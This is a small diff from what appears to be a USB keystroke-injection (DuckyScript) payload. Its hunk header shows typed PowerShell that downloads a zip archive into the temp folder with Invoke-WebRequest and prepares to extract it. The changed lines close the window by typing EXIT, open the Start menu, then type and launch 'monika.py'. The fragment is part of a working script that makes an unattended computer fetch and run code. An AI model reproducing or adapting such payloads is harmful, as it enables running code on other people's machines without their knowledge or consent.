@@ -8,10 +8,11 @@ STRING $z="$env:TEMP\repo.zip"; $d="$env:TEMP\repo_extract"; Invoke-WebRequest "
 DELAY 100
 ENTER
 DELAY 10000
-ALT F4
+STRING EXIT
+DELAY 250
 GUI
 STRING monika.py
-DELAY 250
+DELAY 100
 ENTER
 
 
